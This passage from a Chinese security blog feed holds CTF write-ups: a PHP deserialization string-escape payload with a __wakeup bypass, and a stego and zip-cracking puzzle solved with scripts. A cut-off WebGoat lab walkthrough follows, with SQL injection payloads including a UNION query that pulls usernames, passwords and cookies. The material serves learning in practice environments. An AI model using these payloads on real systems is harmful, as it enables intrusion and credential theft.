src="https://img-blog.csdnimg.cn/20200825235757937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>还有过滤，涉及反序列化字符串逃逸，<br><img src="https://img-blog.csdnimg.cn/20200826001550122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>写入的<code>\0*\0</code>，过滤后变成了<code>chr(0)*chr(0)</code>三个字符，其中吞掉两个字符。所以是字符串逃逸。<br>在源码中看到只有player这个类进行了反序列化，所以pop链需要变化一下。<br><img src="https://img-blog.csdnimg.cn/20200826002939142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>但是前面还有，<br><img src="https://img-blog.csdnimg.cn/20200826003842767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>23个字符会吞掉，替换11.5次，这里加一个字符，在password中加一个字符给它过滤掉，这样就可以过滤24个字符，替换12次。<br><img src="https://img-blog.csdnimg.cn/20200826004022786.png" alt="m0re" loading="lazy"><br>所以payload为</p><pre class="language-html" data-language="html"><code class="language-html">username=m0re%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00&amp;password=1";s:7:"%00*%00pass";O:7:"topsolo":1:&#123;s:7:"%00*%00name";O:7:"midsolo ":1:&#123;s:7:"%00*%00name";O:6:"jungle":1:&#123;s:7:"%00*%00name";s:7:"Lee Sin";&#125;&#125;&#125;;s:8:"%00*%00admin";i:1;&#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/20200826004527703.png#pic_center" alt="m0re" loading="lazy"><br>还有一个过滤条件就是name，<br><img src="https://img-blog.csdnimg.cn/2020082600465595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>过滤使用方法：将小写s换成大写S，name转换成十六进制<code>\6e\61\6d\65</code>，就可以被解析了<br>还有，进行反序列化的时候，需要跳过这个魔术方法，<br><img src="https://img-blog.csdnimg.cn/20200826005047431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>绕过方法：，刚开始看学长wp没看懂为什么要输入一个2来替换1进行绕过wakeup魔术方法，百度了一下。发现这是一个CVE漏洞<br>绕过就是：<strong>当成员属性数目大于实际数目时可绕过</strong><br>这个就是为什么要输入一个2来替换1的原因了，也可以输入其他数字。<br>最终payload</p><pre class="language-html" data-language="html"><code class="language-html">?username=m0re\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=1";S:7:"%00*%00pass";O:7:"topsolo":1:&#123;S:7:"%00*%00\6e\61\6d\65";O:7:"midsolo":2:&#123;S:7:"%00*%00\6e\61\6d\65";O:6:"jungle":1:&#123;S:7:"%00*%00\6e\61\6d\65";s:7:"Lee Sin";&#125;&#125;&#125;;s:8:"%00*%00admin";i:1;&#125;</code></pre><p>访问play.php就可以看到flag了。<br><img src="https://img-blog.csdnimg.cn/20200826010838855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>运行得到 flag<br>最后感谢qwzf大佬提供的环境。tql<br>参考文章——<a href="https://mp.weixin.qq.com/s?__biz=MzAxNTc4MzUwNg==&mid=2247484297&idx=1&sn=dc77c873cb80d798799591a0dd5b7f1f&chksm=9bff80b4ac8809a22b27072c155b98c3272e36739cacd645d5995a91d782c1a36ec6b4c2fd17&mpshare=1&scene=23&srcid=0825YM7il23gIXIDuPsA7S0S&sharer_sharetime=1598342936465&sharer_shareid=6f8ce528d5b894c67a4d474049135f1f#rd">第四届“强网杯”全国网络安全挑战赛WP</a></p><h2 id="miscstudy"><a href="#miscstudy" class="headerlink" title="miscstudy"></a>miscstudy</h2><p>套娃题，<br>第一关<br><img src="https://img-blog.csdnimg.cn/20200824225540942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>选择查看请求可以找到<code>http://39.99.247.28/fonts/1</code><br><img src="https://img-blog.csdnimg.cn/2020082422571650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>一部分flag<br>第二关<br>复制除了flag以外的全部内容。放到以<code>.log</code>为后缀的日志文件。这个是wireshark的日志文件，重新导入wireshark。<br>tip：版本不同，导入位置不同。<br>有的是SSL，有的是TLS<br>导入位置：编辑——首选项——Protocols——SSL(或者TLS)<br><img src="https://img-blog.csdnimg.cn/20200824230513376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后看到<br><img src="https://img-blog.csdnimg.cn/20200824231955179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>get方式，所以直接访问该URL得到图片，另存到本地。<br><code>https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</code><br>图片拖进010editor，在末尾查看到一串base64字符串<br><img src="https://img-blog.csdnimg.cn/20200825001010663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>解密得到部分flag<br>第三关<br>在图片的倒数第二第三第四个IDAT的地方</p><p><img src="https://img-blog.csdnimg.cn/20200826011735537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>进行base64解码，得到二进制数<br><img src="https://img-blog.csdnimg.cn/20200826011711657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>利用python的PIL模块进行绘图(之前团队内比赛有画图的题有过涉及这个模块)</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">60</span>   <span class="token comment">#x坐标 </span>y <span class="token operator">=</span> <span class="token number">60</span>   <span class="token comment">#y坐标 </span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'m0re.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> a<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>z<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        z<span class="token operator">=</span>z<span class="token operator">+</span><span class="token number">1</span>im<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span></code></pre><p>注意：PIL模块只适合python2的版本，python3中可以使用pillow代替.<br>安装pillow模块</p><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> pillow</code></pre><p>成功得到二维码<br><img src="https://img-blog.csdnimg.cn/20200826013318171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>注意顺序，不然还原不出正确的码子。由上至下。<br>扫描得到百度网盘链接。<br><img src="https://img-blog.csdnimg.cn/2020082601344599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>第四关<br>网盘链接中的一个压缩包，里面有张图片。<br><img src="https://img-blog.csdnimg.cn/20200826013851862.jpg#pic_center" alt="m0re" loading="lazy"><br>这里使用，steghide进行爆破，我丢我找半天这个工具，原来我电脑里的工具包里有，我吐了。<br><img src="https://img-blog.csdnimg.cn/20200826021744868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>其实和脚本都一样的原理，，，=.=<br>就是字典的重要性了。换个大点的字典<br><img src="https://img-blog.csdnimg.cn/20200826022709414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>密码：<code>power123</code><br>然后使用stegdetect进行测试，测试是哪种隐写<br>使用方法</p><pre class="language-bash" data-language="bash"><code class="language-bash">stegdetect.exe -tjopi -s <span class="token number">10.0</span> <span class="token operator">&lt;</span>filename.jpg<span class="token operator">></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200826213046585.png#pic_center" alt="m0re" loading="lazy"><br>三颗星，而且是jphide隐写。上面爆破出密码，使用工具解题<br><img src="https://img-blog.csdnimg.cn/20200826213514210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>使用Seek模块，输入密码，然后设置导出的文件类型。这里设置为flag.txt就可以了。<br><img src="https://img-blog.csdnimg.cn/20200826213956120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>第五关<br>下载的level5有伪加密，其他的先不管，先改第一个。就可以将level5.png拖出来了，发现flag。<img src="https://img-blog.csdnimg.cn/2020082622371928.png#pic_center" alt="m0re" loading="lazy"><br>第六关<br>CRC爆破，因为第六关压缩包里面的三个文件很小，只有几个字节<br>所以直接用脚本进行爆破<br><img src="https://img-blog.csdnimg.cn/2020082713392378.png#pic_center" alt="m0re" loading="lazy"><br>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> string<span class="token comment">#dic=string.printable   #各种打印字符</span>dic<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>crc1 <span class="token operator">=</span> <span class="token number">0x9aeacc13</span>  <span class="token comment"># 记得要以0x开头</span>crc2 <span class="token operator">=</span> <span class="token number">0xeed7e184</span>crc3 <span class="token operator">=</span> <span class="token number">0x289585af</span><span class="token keyword">def</span> <span class="token function">CrackCrc5</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic <span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> p <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> q <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    <span class="token keyword">for</span> h <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                        s<span class="token operator">=</span>i<span class="token operator">+</span>j<span class="token operator">+</span>p<span class="token operator">+</span>q<span class="token operator">+</span>h                        <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                            <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">CrackCrc4</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic <span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> p <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> q <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                        s<span class="token operator">=</span>i<span class="token operator">+</span>j<span class="token operator">+</span>p<span class="token operator">+</span>q                        <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                            <span class="token keyword">return</span> <span class="token number">1</span>CrackCrc5<span class="token punctuation">(</span>crc1<span class="token punctuation">)</span>CrackCrc4<span class="token punctuation">(</span>crc2<span class="token punctuation">)</span>CrackCrc5<span class="token punctuation">(</span>crc3<span class="token punctuation">)</span></code></pre><p>时间略长，耐心跑完。<br>第七关<br><img src="https://img-blog.csdnimg.cn/20200827002200411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>将这个图片进行压缩，注意是压缩成zip压缩包。压缩方式很重要。<br>然后进行明文攻击。使用工具进行攻击<br><img src="https://img-blog.csdnimg.cn/20200827003617615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>原来不用一直等，噗！我等了十三分钟。。。吐啦<br>注意手动暂停攻击，然后确定保存就行了。<br>已经成功解密了。<br>两张一样的图片，考虑盲水印。<br><img src="https://img-blog.csdnimg.cn/20200827004047824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>成功得到<img src="https://img-blog.csdnimg.cn/20200827004126828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到一部分flag，然后还有一个URL<br>第八关<br>访问提示的URL<br><img src="https://img-blog.csdnimg.cn/20200827004244981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>看不出来什么，(做题少，没见过)，看大佬wp是snow隐写。长知识了。<br><img src="https://img-blog.csdnimg.cn/20200827004426683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>snow隐写需要密码，这个就是密码。<br><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">在线网站解密</a><br><img src="https://img-blog.csdnimg.cn/20200827004629630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>得到最后一部分flag</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>知识了解：</p><blockquote><p>snow 是一款在html嵌入隐写信息的软件，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p></blockquote><p>这次学到好多内容，不过还是做题越多越好。多刷题。争取下次有比赛能进一次线下。继续加油。</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebGoat靶场搭建及通关记录(一)</title>
      <link href="/posts/a9166075/"/>
      <url>/posts/a9166075/</url>
      
        <content type="html"><![CDATA[<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >搭建WebGoat靶场，以前没玩过这个，涉及的知识挺多的，没事打一打。<br></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、搭建靶场"><a href="#一、搭建靶场" class="headerlink" title="一、搭建靶场"></a>一、搭建靶场</h1><p><font color=#999AAA >靶场环境，只介绍在windows系统中搭建过程。<br>先下载这两个文件<br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webgoat-server-8.1.0.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webgoat-server-8.1.0.jar</a><br><a href="https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webwolf-8.1.0.jar">https://github.com/WebGoat/WebGoat/releases/download/v8.1.0/webwolf-8.1.0.jar</a><br>由于是github的项目，下载时，可能因为网络问题而失败，所以建议用迅雷下载。<br>然后在放到一个专门文件夹内(本人轻微强迫症哈哈，可以随意放)<br>执行下面两条命令就可以了</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -jar webgoat-server-8.0.0.M17.jarjava -jar webwolf-8.0.0.M17.jar</code></pre><p><img src="https://img-blog.csdnimg.cn/20200815140213600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>访问<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a>就可以了。<br>注册账号随便弄一个就可以了。<br><font color=#F22225 >**<em>补充一个坑，可能会遇到的一个问题**</em><br>就是搭建好靶场后没什么问题，第二次进入的问题。(免得像我一样的小白不知道而再去重新搭建，浪费时间)<br>先描述一下问题：就是访问<code>http://127.0.0.1:8080</code>时浏览器返回找不到网页了，没有进入到靶场环境。附图如下：<br><img src="https://img-blog.csdnimg.cn/20200818185243614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这个不是靶场出问题了，而是不是第一次进入靶场，原来已经进入过并注册了用户名和密码了，就要进入登录界面直接登录了。所以环境没问题。<br>解决办法也很简单：访问这个——<a href="http://127.0.0.1:8080/WebGoat/login">http://127.0.0.1:8080/WebGoat/login</a>，webwolf也是同理。就不多嘴了哈。</p><h1 id="二、通关攻略"><a href="#二、通关攻略" class="headerlink" title="二、通关攻略"></a>二、通关攻略</h1><p><font color=#999AAA >Introduction的部分就是检查靶场功能。看不懂英文的话，建议用翻译插件翻译一下。</p><h2 id="1-General"><a href="#1-General" class="headerlink" title="1.General"></a>1.General</h2><h3 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a>HTTP Basics</h3><p><font color=#F22225 >第二关<br><font color=#999AAA >就是输入用户名就可以了，放一张图。<br><img src="https://img-blog.csdnimg.cn/20200815140848267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第三关<br><font color=#999AAA >提示是需要使用Owasp zap进行抓包查看，这里使用burp进行<br><img src="https://img-blog.csdnimg.cn/20200815141431418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>将1改为6放包，然后答题正确。<br><img src="https://img-blog.csdnimg.cn/20200815141023393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a>HTTP Proxies</h3><p><font color=#F22225 >第六关<br><font color=#999AAA >前面的都是一款工具的教程，叫做Owasp zap、可以做代理，同时还是一个漏洞扫描工具，我抓包一般不用它，所以前面的看看就行直接绕过。还是使用burp来抓包。漏扫的话可以了解一下，免费的软件。<br>过关有点坑，直接抓取数据包，按照修改题目要求。<br>坑：直接修改changeme，怎么都是不对的，因为修改为get请求了，所以提交参数的方式就应该是get方式，要在URL里面进行提交。坑的话就这一点。按照下图的方式修改就可以了。<br><img src="https://img-blog.csdnimg.cn/20200815144902422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>反思：第一次没有想到get请求改变后的变化，想的不够充分。现在想想，题目怎么可能就是让改一下参数呢？那如果这样，它设置这个要求的目的在哪，所以想的时候还是想想为什么会有这个要求。</p><h2 id="2-Injection-Flaws"><a href="#2-Injection-Flaws" class="headerlink" title="2.Injection Flaws"></a>2.Injection Flaws</h2><h3 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h3><p><font color=#F22225 >第三关<br><font color=#999AAA >SQL注入，查看到前两小节的知识，了解到是使用联合查询进行注入。<br>这个很重要，后面会用到，注意userid的类型<br><img src="https://img-blog.csdnimg.cn/20200815162412517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先尝试单引号闭合。</p><pre class="language-bash" data-language="bash"><code class="language-bash">' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> --</code></pre><p>尝试单引号闭合成功，且查询到了，WebGoat表中的内容，<br><img src="https://img-blog.csdnimg.cn/20200815153959395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >union查询的特性就是上下两个SQL 语句所产生的栏位需要是同样的资料种类，所以观察刚刚查询出来的列数，了解到有七列，所以接下来要写在union后的SQL语句也必须要列出7列才行，因为已经知道user_system_data这个数据表中的前4列了，所以剩下的3列随便填点什么就行，需要注意的是，数据类型也必须一致。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' union select 1,user_name,password,'</span>hello<span class="token string">','</span>bye'<span class="token punctuation">,</span>cookie<span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> user_system_data <span class="token comment">--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200815162637269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#1FAFAF >这里注意userid是字符串类型而不是int类型，前面提示过了，看上面的图。</p><p><font color=#F11111 >还有一种方法：<br>直接查询全部内容</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token punctuation">;</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_system_data <span class="token comment">--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200815162902347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后将结果输入第二个框里就过关<br><img src="https://img-blog.csdnimg.cn/20200815163052169.png#pic_center" alt="m0re" loading="lazy"></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><font color=#F22225 >第五关能力有限，暂时没有解出。</font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p><font color=#F22225 >第七关</font><br><font color=#999AAA ><br>字符类型的SQL注入，通过Smith可以查看一位用户的数据<br></font><br>测试，发现确实是存在注入的。</p><pre class="language-sql" data-language="sql"><code class="language-sql">Smith' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--</span></code></pre><p><img 